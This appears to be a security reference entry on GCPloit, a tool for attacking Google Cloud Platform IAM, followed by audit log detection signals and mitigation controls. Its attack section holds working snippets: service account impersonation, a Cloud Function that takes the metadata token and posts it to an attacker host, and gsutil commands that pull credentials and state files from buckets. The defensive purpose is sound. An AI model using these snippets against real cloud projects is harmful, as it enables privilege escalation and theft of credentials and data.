GCPloit — Google Cloud Platform Exploitation Tool

Category: Cloud Security — GCP Attack Tooling
Applies To: GCP projects, GCP IAM, GCE, GCS, Cloud Functions, Cloud Run, GKE
Reference: https://github.com/RedTeamOperations/GCPloit (research/educational tool)

Overview

GCPloit is an open-source tool designed for red teaming and penetration testing of Google Cloud Platform environments. It automates the discovery and exploitation of common GCP IAM misconfigurations, privilege escalation paths, and lateral movement opportunities. Security teams use it to test whether their GCP IAM configurations are actually as restrictive as intended; attackers use similar techniques when they have stolen a GCP service account key or obtained a metadata server token.

Understanding GCPloit from a defender's perspective is essential because it codifies the exact attack paths that security engineers must design mitigations for. When Google's own red team or an external pen tester runs GCPloit against a GCP project, the findings directly map to IAM misconfiguration risk.

Key Attack Techniques Automated by GCPloit

1. Permission Enumeration

GCPloit uses the testIamPermissions API to discover exactly what the current SA can do without brute-forcing API calls:

# Conceptual: GCPloit permission check
service = build('cloudresourcemanager', 'v1', credentials=creds)
body = {"permissions": [
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.getAccessToken",
    "resourcemanager.projects.setIamPolicy",
    "cloudfunctions.functions.create",
    "storage.objects.list",
    # ... full list of escalation permissions
]}
response = service.projects().testIamPermissions(resource=f"projects/{project}", body=body).execute()
# Returns only the permissions the caller actually has

2. Service Account Impersonation Attack

# Use actAs to get access token for target SA
import google.auth
from google.oauth2 import service_account
from google.auth.transport.requests import Request

# Using the current credentials, impersonate target SA
target_sa = "admin@target-project.iam.gserviceaccount.com"
credentials, _ = google.auth.default()

from google.auth import impersonated_credentials
target_credentials = impersonated_credentials.Credentials(
    source_credentials=credentials,
    target_principal=target_sa,
    target_scopes=["https://www.googleapis.com/auth/cloud-platform"],
    lifetime=3600
)
target_credentials.refresh(Request())
print(f"Got token for {target_sa}: {target_credentials.token[:20]}...")

3. Cloud Function Deployment for Code Execution

If the SA has cloudfunctions.functions.create and can pass a high-privileged SA:

# Deploy a Cloud Function that runs as a higher-privileged SA
# The function can exfiltrate tokens or make API calls on behalf of that SA
function_body = {
    "name": f"projects/{project}/locations/us-central1/functions/exfil",
    "serviceAccountEmail": "admin-sa@target-project.iam.gserviceaccount.com",
    "httpsTrigger": {},
    "entryPoint": "run",
    "runtime": "python311",
    "inlineSourceCode": {
        "files": {
            "main.py": """
import requests
def run(request):
    token = requests.get(
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        headers={'Metadata-Flavor': 'Google'}
    ).json()['access_token']
    requests.post('https://attacker.com/token', data={'token': token})
    return 'ok'
"""
        }
    }
}

4. GCS Bucket Exfiltration

# List all accessible buckets
gsutil ls gs://   # with stolen credentials

# List objects in a bucket
gsutil ls gs://target-bucket/

# Download all objects
gsutil -m cp -r gs://target-bucket/ ./local_copy/

# Look for high-value files
gsutil cat gs://target-bucket/credentials.json
gsutil cat gs://target-bucket/.env
gsutil cat gs://target-bucket/terraform.tfstate  # Contains all infra resource IDs

5. terraform.tfstate as Intelligence Source

Terraform state files in GCS buckets are extremely high-value intelligence:
- Lists all GCP resources (VMs, databases, networks, service accounts)
- May contain sensitive resource identifiers (DB instance names, SA emails)
- Reveals network topology, firewall rules, IAM bindings
- May contain passwords or API keys in resource configuration

Detection

Cloud Audit Log Signals for GCPloit Activity

Activity Log Entry Suspicious Signal
SA token generation iam.serviceAccounts.generateAccessToken Unusual source; unexpected SA impersonation
Bulk permission enumeration cloudresourcemanager.projects.testIamPermissions Rapid enumeration of permission list
IAM policy change SetIamPolicy on project/org New binding added; especially Owner role
Function creation/update cloudfunctions.functions.create/update New function; changed function SA
Bucket listing storage.buckets.list with SA Rapid enumeration across all buckets
SA key creation iam.serviceAccountKeys.create Key created for SA not normally keyed
GKE cluster access container.clusters.list + container.clusters.get Full cluster enumeration

Mitigation Controls

# Threat Mitigation Where
1 actAs escalation Never bind actAs on privileged SAs to lower trust workloads; audit all actAs bindings GCP IAM
2 Default SA over-privileged Deploy org policy: constraints/iam.automaticIamGrantsForDefaultServiceAccounts: false GCP Org Policy
3 terraform.tfstate exposure Use a private GCS bucket with uniform bucket-level access; grant only terraform SA access GCS IAM
4 Function deployment for escalation Restrict cloudfunctions.functions.create/update + iam.serviceAccounts.actAs together IAM
5 SA key creation Disable SA key creation via org policy; rotate any existing keys immediately GCP Org Policy + IAM
6 Undetected GCPloit activity Enable Cloud Audit Logs for all services; alert on testIamPermissions bursts; alert on new actAs SA impersonation Cloud Monitoring + SIEM
7 GCS data exfiltration VPC Service Controls perimeter; restrict storage API access to known SA and network ranges VPC-SC

Key Takeaways

  • GCPloit automates GCP IAM misconfiguration exploitation — the vulnerabilities it finds are real and common.
  • actAs + function/deployment permissions are the primary escalation mechanism in GCP.
  • The default Compute SA with Editor role is the single most dangerous common GCP misconfiguration.
  • SA key files should not exist in production environments — use Workload Identity exclusively.
  • Cloud Audit Logs are the defender's primary detection mechanism; alert on rapid permission enumeration and unexpected actAs calls.
  • VPC Service Controls create an API access perimeter that limits GCPloit even if an SA is compromised.
